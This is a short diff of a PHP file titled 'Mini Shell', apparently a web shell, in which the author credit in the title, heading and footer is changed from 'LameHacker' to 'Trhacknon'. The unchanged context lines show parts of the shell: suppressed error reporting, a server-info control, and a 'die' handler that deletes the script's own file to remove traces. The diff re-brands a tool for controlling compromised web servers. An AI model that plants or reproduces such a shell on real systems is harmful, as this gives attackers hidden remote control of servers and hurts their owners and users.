@@ -2,7 +2,7 @@
 <html>
 	<head>
 		<?php error_reporting(0);?>
-		<title>Mini Shell</title>
+		<title>Mini Shell by Trhacknon</title>
 		<meta charset="UTF-8" />
 		<meta name="description" content="" />
 		<meta name="note" content="Changing The Names Wont Make You The Author :)" />
@@ -95,7 +95,7 @@
 	</head>
 	<body>
 		<div class="heading">
-			<font>Mini Shell</font><br>
+			<font>Mini Shell by Trhacknon</font><br>
 		</div>
 		<div class="buttons"><center>
 			<a href="?server_info">
@@ -349,7 +349,7 @@ if (isset($_GET['die'])) {if(@unlink(preg_replace('!\(\d+\)\s.*!', '', __FILE__)
 }?>
 		</div>
 		<div class="footer">
-			<font>Developed By LameHacker</a></font>
+			<font>Developed By Trhacknon</a></font>
 		</div>
 	</body>
 </html>
